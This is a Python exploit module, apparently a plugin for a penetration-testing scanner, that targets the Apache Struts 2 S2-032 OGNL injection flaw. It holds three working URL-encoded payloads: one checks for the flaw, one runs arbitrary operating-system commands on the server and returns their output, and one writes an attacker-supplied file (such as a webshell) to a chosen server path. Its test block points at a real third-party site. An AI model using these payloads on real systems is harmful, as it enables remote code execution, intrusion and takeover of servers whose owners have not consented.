#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


def info(data=None):
    info = {
        "name": "Struts 2-032",
        "info": "Struts 2-032",
        "level": "high",
        "type": "rec",
    }
    return info

def prove(data):
    data = init(data, 'struts')
    if data['url'] != None:
        prove_poc = '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=struts2_security_vul&path=_str2016'''
        poc_key = "struts2_security_vul",
        try:
            headers = {'Content-Type': "application/x-www-form-urlencoded"}
            res = curl('get', data['url'], params=prove_poc, headers=headers)
            if poc_key in res.headers or poc_key in res.text:
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": data['url'], "key": 'struts2_032'})
        except:
            pass
    return data


def exec(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        if 'cmd' not in data.keys() :
            raise Exception("None cmd ")
        cmd = data['cmd']
        exec_poc =  '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=%COMMAND%&pp=\\\\AAAA&ppp=%20&encoding=UTF-8'''
        headers = {}
        try:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            res = curl('get', data['url'], params=exec_poc.replace("%COMMAND%", cmd)).text
            data['flag'] = 1
            data['data'].append({"poc": exec_poc})
            data['res'].append({"info": res, "key": cmd})
        except:
            pass
    return data



def upload(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        upload_poc = '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f'''
        if 'srcpath' not in data.keys() :
            raise Exception("None srcpath ")
        if 'despath' not in data.keys() :
            raise Exception("None despath ")
        despath = data['despath']
        content = _read_file(data['srcpath'])
        headers =  {}
        try:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            curl('get', data['url'],params=upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content),headers=headers)
            data['flag'] = 1
            data['data'].append({"poc": upload_poc})
            data['res'].append({"info": despath, "key": "upload"})
        except:
            pass

    return data


def _read_file(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))